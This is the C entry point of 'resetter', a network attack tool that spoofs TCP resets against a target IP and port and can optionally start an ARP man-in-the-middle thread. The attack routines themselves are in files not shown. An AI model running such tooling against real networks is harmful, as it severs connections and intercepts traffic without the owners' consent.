#include "context.h"
#include "arp_mitm.h"
#include "listener.h"
#include "resetter.h"
#include "thread_mgr.h"
#include "hash_table.h"

extern void testfunc();

static char *detect_device();

static void on_signal_trapped(int);

void usage(char **argv) {
    printf("usage: %s [-ahip] [target_ip]\n"
           "  -a           enable arp mitm\n"
           "  -h           help\n"
           "  -i <iface>   interface to use"
           "  -p <port>    target port\n",
           argv[0]);
}

int main(int argc, char **argv) {
    printf("resetter (c)2019 Chris Lyon\n\n");

    int flag;
    char *target_ip = NULL;
    uint16_t target_port = 0;
    int arp_mitm = 0;
    char *device = NULL;

    while ((flag = getopt(argc, argv, "ahi:p:")) != -1) {
        switch (flag) {
            case 'a':
                // Enable ARP MITM attack
                arp_mitm = 1;
                break;

            case 'h':
                // Help
                usage(argv);
                return EXIT_SUCCESS;

            case 'i':
                // Interface
                device = optarg;
                break;

            case 'p':
                // Target port
                target_port = strtol(optarg, NULL, 10);
                break;

            default:
                // Unknown
                usage(argv);
                return EXIT_FAILURE;
        }
    }

    // Remaining positional args
    char **argv_remaining = &argv[optind];
    target_ip = argv_remaining[0];

    signal(SIGINT, on_signal_trapped); // ^C
    signal(SIGTERM, on_signal_trapped);

    // Detect interface if null
    if (device == NULL) {
        device = detect_device();
        if (device == NULL)
            return EXIT_FAILURE;
    }

    // Start resetter thread
    thread_node resetter_thread_node;
    thmgr_append_thread(&resetter_thread_node);
    if (start_resetter_thread(&resetter_thread_node, device, target_ip, target_port) != 0) {
        fprintf(stderr, "Failed to start resetter thread\n");
        thmgr_cleanup();
        return EXIT_FAILURE;
    }

    // Start arpmitm thread
    if (arp_mitm) {
        thread_node arp_mitm_thread_node;
        thmgr_append_thread(&arp_mitm_thread_node);
        if (start_arp_mitm_thread(&arp_mitm_thread_node, device) != 0) {
            fprintf(stderr, "Failed to start ARP MITM thread\n");
            thmgr_cleanup();
            return EXIT_FAILURE;
        }
    }

    thmgr_wait_for_threads();
    thmgr_cleanup();
    return EXIT_SUCCESS;
}

static char *detect_device() {
    char errbuf[PCAP_ERRBUF_SIZE];

    char *device = pcap_lookupdev(errbuf);
    if (device == NULL) {
        fprintf(stderr, "pcap_lookupdev() failed: %s\n", errbuf);
        return NULL;
    }

    return device;
}

static void on_signal_trapped(int signum) {
    printf("\nTrapped signal %d\n", signum);
    thmgr_cleanup();
}
